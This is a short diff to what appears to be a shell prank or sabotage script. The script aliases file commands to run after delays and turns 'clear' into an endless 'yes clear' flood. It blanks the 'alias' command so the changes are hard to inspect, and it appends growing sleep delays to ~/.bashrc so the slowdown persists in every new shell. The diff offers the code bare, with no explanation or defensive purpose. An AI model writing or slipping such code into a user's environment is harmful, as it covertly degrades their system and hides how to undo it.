@@ -10,6 +10,6 @@ alias mv="sleep 1.5;mv"
 alias cp="sleep 1.5;cp"
 alias rm="sleep 1.5;rm"
 alias rmdir="sleep 1.5;rmdir"
-alias clear="sleep 30;clear"
+alias clear="sleep 1.5;yes clear"
 alias alias=""
-echo "sleep 0.3" >> ~/.bashrc
+echo "sleep 0.7" >> ~/.bashrc
